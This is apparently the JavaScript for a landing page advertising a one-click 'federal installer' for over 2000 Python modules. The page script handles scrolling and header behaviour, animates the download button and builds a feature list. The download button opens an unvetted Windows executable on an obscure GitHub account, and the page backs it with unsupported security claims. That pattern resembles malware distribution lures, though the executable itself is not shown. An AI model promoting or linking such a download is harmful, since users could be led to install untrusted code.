// Smooth scroll for anchor links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        
        document.querySelector(this.getAttribute('href')).scrollIntoView({
            behavior: 'smooth'
        });
    });
});

// Toggle the download button animation
const downloadButton = document.querySelector('.download-button');
downloadButton.addEventListener('mouseenter', () => {
    downloadButton.style.transform = 'scale(1.05)';
    downloadButton.style.transition = 'transform 0.3s ease';
});

downloadButton.addEventListener('mouseleave', () => {
    downloadButton.style.transform = 'scale(1)';
});

// Open the download link in a new tab
downloadButton.addEventListener('click', () => {
    window.open('https://github.com/KXZZW/federalinstaller/releases/download/federal/federal.import.exe', '_blank');
});

// Scroll event for sticky header (optional)
window.addEventListener('scroll', function () {
    let header = document.querySelector('.header');
    if (window.scrollY > 100) {
        header.classList.add('sticky');
    } else {
        header.classList.remove('sticky');
    }
});

// Example function for dynamic content load (if needed)
function loadFeatureList() {
    const featureListContainer = document.querySelector('.feature-list');
    const features = [
        { icon: '🔧', title: 'Automated Installation', description: 'Install necessary modules with one click.' },
        { icon: '⚡', title: 'Fast & Efficient', description: 'Quick installation of over 2000 modules.' },
        { icon: '🔒', title: 'Secure & Reliable', description: 'Only the most trusted modules are installed.' },
        { icon: '📦', title: 'Comprehensive Support', description: 'Supports multiple Python libraries and frameworks.' },
        { icon: '🛠', title: 'Easy to Use', description: 'Simple interface with minimal setup.' }
    ];

    // Populate the feature list dynamically
    features.forEach(feature => {
        const featureItem = document.createElement('li');
        featureItem.classList.add('feature');
        featureItem.innerHTML = `
            <div class="feature-icon">${feature.icon}</div>
            <h3 class="feature-title">${feature.title}</h3>
            <p class="feature-description">${feature.description}</p>
        `;
        featureListContainer.appendChild(featureItem);
    });
}

// Load the feature list dynamically when the page loads
window.onload = loadFeatureList;
